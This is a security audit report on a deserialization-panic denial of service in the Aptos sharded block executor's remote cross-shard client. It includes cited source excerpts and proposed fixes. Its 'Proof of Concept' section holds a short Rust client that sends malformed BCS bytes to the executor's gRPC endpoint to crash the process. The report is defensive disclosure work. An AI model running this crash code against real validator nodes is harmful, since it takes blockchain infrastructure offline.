# Audit Report

## Title
Remote Cross-Shard Client Deserialization Panic DoS in Sharded Block Execution

## Summary
The `RemoteCrossShardClient::receive_cross_shard_msg()` function contains an unsafe deserialization operation that uses `.unwrap()` on potentially untrusted network data. A malicious actor with network access to the executor service can send malformed BCS-encoded data, causing a panic that terminates the entire validator node process. [1](#0-0) 

## Finding Description

The remote executor service implements sharded block execution where multiple executor shards communicate cross-shard state updates via network messages. The vulnerability exists in the message reception path:

1. **Vulnerable Deserialization**: The `receive_cross_shard_msg()` function receives messages from the network via a gRPC channel and deserializes them using `bcs::from_bytes().unwrap()` without error handling. [1](#0-0) 

2. **No Authentication**: The underlying `NetworkController` and `GRPCNetworkMessageServiceServerWrapper` accept messages from any network peer without authentication or sender validation. [2](#0-1) 

3. **Panic Propagation**: The receiver runs in a thread spawned by the executor service. When deserialization fails, the panic is caught by the global panic handler which terminates the process. [3](#0-2) [4](#0-3) 

4. **Attack Vector**: 
   - Attacker identifies the executor service's listening address and port
   - Connects to the gRPC endpoint for cross-shard messages (format: `cross_shard_{round}`)
   - Sends malformed BCS data that fails deserialization
   - The `.unwrap()` panics, triggering the crash handler
   - The entire validator process exits with code 12 [5](#0-4) 

## Impact Explanation

**Severity: Critical** (but see Likelihood section for deployment considerations)

This vulnerability meets **Critical Severity** criteria under:
- **Total loss of liveness/network availability**: An attacker can repeatedly crash validator nodes running remote executor services, preventing them from participating in consensus
- **Non-recoverable network partition**: If multiple validators deploy this service and are targeted simultaneously, it could cause widespread network disruption

The impact affects:
- All validator nodes using the remote executor service for sharded execution
- Block production capacity (validators offline cannot propose/vote)
- Network liveness if enough validators are impacted
- Potential consensus safety if timing allows exploitation during critical rounds

## Likelihood Explanation

**Likelihood: Low to Very Low**

Critical considerations that reduce exploitability:

1. **Deployment Status**: The remote executor service is a **separate binary** for distributed sharded execution. It requires explicit deployment with specific command-line configuration. [6](#0-5) 

2. **Network Architecture**: The service is designed for **internal validator infrastructure** communication between coordinator and executor shards, not inter-validator communication. Access requires:
   - Knowledge of internal network topology
   - Network access to internal executor service ports
   - Knowledge of coordinator/shard addresses

3. **Trust Model Boundary**: According to the bug bounty trust model, this requires either:
   - Privileged access to validator network infrastructure (insider threat)
   - Successful network penetration of validator internal networks
   - Both scenarios fall outside "unprivileged attacker" scope

4. **Optional Feature**: Sharded execution can run in local mode (in-process) instead of remote mode, avoiding network exposure entirely. [7](#0-6) 

## Recommendation

Implement defensive error handling for network deserialization:

**Option 1: Result-based error handling**
```rust
fn receive_cross_shard_msg(&self, current_round: RoundId) -> Result<CrossShardMsg, Error> {
    let rx = self.message_rxs[current_round].lock().unwrap();
    let message = rx.recv().unwrap();
    let msg = bcs::from_bytes(&message.to_bytes())
        .map_err(|e| Error::DeserializationFailed(e))?;
    Ok(msg)
}
```

**Option 2: Panic recovery with logging**
```rust
fn receive_cross_shard_msg(&self, current_round: RoundId) -> CrossShardMsg {
    let rx = self.message_rxs[current_round].lock().unwrap();
    let message = rx.recv().unwrap();
    match bcs::from_bytes(&message.to_bytes()) {
        Ok(msg) => msg,
        Err(e) => {
            error!("Failed to deserialize cross-shard message: {:?}", e);
            // Send stop message to gracefully terminate instead of panicking
            CrossShardMsg::StopMsg
        }
    }
}
```

**Option 3: Add authentication layer**
Implement mutual TLS or authenticated channels at the `NetworkController` level to validate sender identity before accepting messages. [8](#0-7) 

## Proof of Concept

```rust
// PoC: Remote malicious client sending malformed BCS data
use aptos_protos::remote_executor::v1::{
    network_message_service_client::NetworkMessageServiceClient,
    NetworkMessage,
};
use std::net::SocketAddr;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Target: executor service listening on 127.0.0.1:50051
    let target = "http://127.0.0.1:50051";
    let mut client = NetworkMessageServiceClient::connect(target).await?;
    
    // Send malformed BCS data for round 0
    let malformed_bcs = vec![0xFF, 0xFF, 0xFF, 0xFF]; // Invalid BCS encoding
    
    let request = tonic::Request::new(NetworkMessage {
        message: malformed_bcs,
        message_type: "cross_shard_0".to_string(),
    });
    
    // This will be received by RemoteCrossShardClient::receive_cross_shard_msg()
    // which calls bcs::from_bytes().unwrap() and panics, crashing the node
    match client.simple_msg_exchange(request).await {
        Ok(_) => println!("Malformed message sent successfully"),
        Err(e) => eprintln!("Error: {}", e),
    }
    
    Ok(())
}
```

**Expected Result**: The executor service process terminates with exit code 12 due to deserialization panic.

---

## Notes

While this vulnerability technically exists in the codebase, its exploitability depends heavily on deployment architecture. Validators running sharded execution in **local mode** (default) are not vulnerable. Only validators that deploy the **remote executor service** with network-exposed endpoints are at risk, and exploitation requires network access to internal validator infrastructure.

For maximum security, validators should:
1. Use local sharded execution when possible
2. Deploy remote executors on isolated internal networks
3. Implement mutual TLS authentication for remote executor communication
4. Add input validation and error handling for all network deserialization operations

### Citations

**File:** execution/executor-service/src/remote_cross_shard_client.rs (L61-66)
```rust
    fn receive_cross_shard_msg(&self, current_round: RoundId) -> CrossShardMsg {
        let rx = self.message_rxs[current_round].lock().unwrap();
        let message = rx.recv().unwrap();
        let msg: CrossShardMsg = bcs::from_bytes(&message.to_bytes()).unwrap();
        msg
    }
```

**File:** secure/net/src/grpc_network_service/mod.rs (L93-115)
```rust
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
```

**File:** aptos-move/aptos-vm/src/sharded_block_executor/cross_shard_client.rs (L26-45)
```rust
    pub fn start<S: StateView + Sync + Send>(
        cross_shard_state_view: Arc<CrossShardStateView<S>>,
        cross_shard_client: Arc<dyn CrossShardClient>,
        round: RoundId,
    ) {
        loop {
            let msg = cross_shard_client.receive_cross_shard_msg(round);
            match msg {
                RemoteTxnWriteMsg(txn_commit_msg) => {
                    let (state_key, write_op) = txn_commit_msg.take();
                    cross_shard_state_view
                        .set_value(&state_key, write_op.and_then(|w| w.as_state_value()));
                },
                CrossShardMsg::StopMsg => {
                    trace!("Cross shard commit receiver stopped for round {}", round);
                    break;
                },
            }
        }
    }
```

**File:** crates/crash-handler/src/lib.rs (L26-57)
```rust
pub fn setup_panic_handler() {
    panic::set_hook(Box::new(move |pi: &PanicHookInfo<'_>| {
        handle_panic(pi);
    }));
}

// Formats and logs panic information
fn handle_panic(panic_info: &PanicHookInfo<'_>) {
    // The Display formatter for a PanicHookInfo contains the message, payload and location.
    let details = format!("{}", panic_info);
    let backtrace = format!("{:#?}", Backtrace::new());

    let info = CrashInfo { details, backtrace };
    let crash_info = toml::to_string_pretty(&info).unwrap();
    error!("{}", crash_info);
    // TODO / HACK ALARM: Write crash info synchronously via eprintln! to ensure it is written before the process exits which error! doesn't guarantee.
    // This is a workaround until https://github.com/aptos-labs/aptos-core/issues/2038 is resolved.
    eprintln!("{}", crash_info);

    // Wait till the logs have been flushed
    aptos_logger::flush();

    // Do not kill the process if the panics happened at move-bytecode-verifier.
    // This is safe because the `state::get_state()` uses a thread_local for storing states. Thus the state can only be mutated to VERIFIER by the thread that's running the bytecode verifier.
    //
    // TODO: once `can_unwind` is stable, we should assert it. See https://github.com/rust-lang/rust/issues/92988.
    if state::get_state() == VMState::VERIFIER || state::get_state() == VMState::DESERIALIZER {
        return;
    }

    // Kill the process
    process::exit(12);
```

**File:** execution/executor-service/src/remote_executor_service.rs (L21-55)
```rust
impl ExecutorService {
    pub fn new(
        shard_id: ShardId,
        num_shards: usize,
        num_threads: usize,
        self_address: SocketAddr,
        coordinator_address: SocketAddr,
        remote_shard_addresses: Vec<SocketAddr>,
    ) -> Self {
        let service_name = format!("executor_service-{}", shard_id);
        let mut controller = NetworkController::new(service_name, self_address, 5000);
        let coordinator_client = Arc::new(RemoteCoordinatorClient::new(
            shard_id,
            &mut controller,
            coordinator_address,
        ));
        let cross_shard_client = Arc::new(RemoteCrossShardClient::new(
            &mut controller,
            remote_shard_addresses,
        ));

        let executor_service = Arc::new(ShardedExecutorService::new(
            shard_id,
            num_shards,
            num_threads,
            coordinator_client,
            cross_shard_client,
        ));

        Self {
            shard_id,
            controller,
            executor_service,
        }
    }
```

**File:** execution/executor-service/src/main.rs (L27-48)
```rust
fn main() {
    let args = Args::parse();
    aptos_logger::Logger::new().init();

    let (tx, rx) = crossbeam_channel::unbounded();
    ctrlc::set_handler(move || {
        tx.send(()).unwrap();
    })
    .expect("Error setting Ctrl-C handler");

    let _exe_service = ProcessExecutorService::new(
        args.shard_id,
        args.num_shards,
        args.num_executor_threads,
        args.coordinator_address,
        args.remote_executor_addresses,
    );

    rx.recv()
        .expect("Could not receive Ctrl-C msg from channel.");
    info!("Process executor service shutdown successfully.");
}
```

**File:** execution/executor-service/src/local_executor_helper.rs (L1-50)
```rust
// Copyright (c) Aptos Foundation
// Licensed pursuant to the Innovation-Enabling Source Code License, available at https://github.com/aptos-labs/aptos-core/blob/main/LICENSE

use aptos_infallible::Mutex;
use aptos_logger::info;
use aptos_storage_interface::state_store::state_view::cached_state_view::CachedStateView;
use aptos_vm::{
    sharded_block_executor::{local_executor_shard::LocalExecutorClient, ShardedBlockExecutor},
    AptosVM,
};
use once_cell::sync::Lazy;
use std::sync::Arc;

pub static SHARDED_BLOCK_EXECUTOR: Lazy<
    Arc<Mutex<ShardedBlockExecutor<CachedStateView, LocalExecutorClient<CachedStateView>>>>,
> = Lazy::new(|| {
    info!("LOCAL_SHARDED_BLOCK_EXECUTOR created");
    Arc::new(Mutex::new(
        LocalExecutorClient::create_local_sharded_block_executor(AptosVM::get_num_shards(), None),
    ))
});


```

**File:** secure/net/src/network_controller/mod.rs (L94-113)
```rust
impl NetworkController {
    pub fn new(service: String, listen_addr: SocketAddr, timeout_ms: u64) -> Self {
        let inbound_handler = Arc::new(Mutex::new(InboundHandler::new(
            service.clone(),
            listen_addr,
            timeout_ms,
        )));
        let outbound_handler = OutboundHandler::new(service, listen_addr, inbound_handler.clone());
        info!("Network controller created for node {}", listen_addr);
        Self {
            inbound_handler,
            outbound_handler,
            inbound_rpc_runtime: Runtime::new().unwrap(),
            outbound_rpc_runtime: Runtime::new().unwrap(),
            // we initialize the shutdown handles when we start the network controller
            inbound_server_shutdown_tx: None,
            outbound_task_shutdown_tx: None,
            listen_addr,
        }
    }
```
